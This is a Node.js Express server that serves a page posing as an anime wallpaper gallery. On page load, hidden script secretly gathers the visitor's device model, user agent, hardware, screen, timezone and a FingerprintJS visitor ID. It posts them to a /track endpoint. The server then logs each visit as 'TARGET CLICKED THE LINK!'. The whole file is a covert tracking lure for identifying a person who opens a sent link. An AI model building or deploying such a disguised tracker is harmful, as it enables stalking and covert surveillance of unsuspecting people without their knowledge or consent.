const express = require('express');
const app = express();
app.use(express.json({ limit: '10mb' }));

// Bangladesh + World Popular Models
const modelNames = {
    // Redmi / Xiaomi / Poco
    '23021RAAEG': 'Redmi 13C',
    '23028RA60L': 'Redmi 13C',
    '23053RN02Y': 'Redmi 13C / Poco C65',
    '23129RAAEG': 'Redmi 14C',
    '22101317C': 'Redmi Note 12 5G',
    '23013RK75C': 'Redmi Note 12',
    '2201117TG': 'Redmi Note 11',

    // Samsung
    'SM-A145F': 'Galaxy A14',
    'SM-A155F': 'Galaxy A15',
    'SM-A235F': 'Galaxy A23',
    'SM-A325F': 'Galaxy A32',
    'SM-A515F': 'Galaxy A51',

    // Realme, Vivo, Infinix, Tecno etc.
    'RMX3391': 'Realme 9i',
    'X669C': 'Infinix Hot 12',
    'TECNO CK7n': 'Tecno Spark 20',
    // aro add korte paro
};

app.get('/', (req, res) => {
    const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anime Gallery HD</title>
    <style>
        body { margin:0; background:#000; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        img { max-width:100%; max-height:100%; object-fit:contain; }
    </style>
</head>
<body>
    <img src="https://images6.alphacoders.com/135/thumbbig-1358426.webp" alt="Anime Wallpaper">
    
    <script src="https://openfpcdn.io/fingerprintjs/v5" async></script>
   
    <script>
        async function getFullDeviceInfo() {
            let deviceName = "Unknown Device";

            // High Entropy UA
            if (navigator.userAgentData) {
                try {
                    const ua = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
                    
                    const modelCode = ua.model ? ua.model.trim() : '';
                    const platform = ua.platform || 'Unknown';

                    if (modelCode) {
                        deviceName = window.modelNames?.[modelCode] || modelCode;
                    } else if (platform === 'Android') {
                        deviceName = 'Android Device';
                    } else {
                        deviceName = platform + ' ' + (ua.platformVersion || '');
                    }
                } catch(e) {}
            }

            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceFullName: deviceName,
                deviceModelCode: navigator.userAgentData?.model || '',
                screen: { width: screen.width, height: screen.height },
                hardware: { cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            // FingerprintJS
            try {
                const fp = await import('https://openfpcdn.io/fingerprintjs/v5')
                    .then(FingerprintJS => FingerprintJS.load());
                const result = await fp.get();
                info.fingerprint = { visitorId: result.visitorId };
            } catch(e) {}

            fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(() => {});

            console.log("📤 Info Sent");
        }

        window.modelNames = ${JSON.stringify(modelNames)};
        window.onload = getFullDeviceInfo;
    </script>
</body>
</html>`;
    res.send(html);
});

app.post('/track', (req, res) => {
    console.log('\n🔥🔥 TARGET CLICKED THE LINK! 🔥🔥');
    console.log('📱 Device Full Name :', req.body.deviceFullName || 'N/A');
    console.log('📟 Model Code       :', req.body.deviceModelCode || 'N/A');
    console.log('🔍 Full Information:');
    console.dir(req.body, { depth: null });
    console.log('--------------------------------------------------\n');
   
    res.status(200).send('ok');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('Server is running on port', PORT);
});
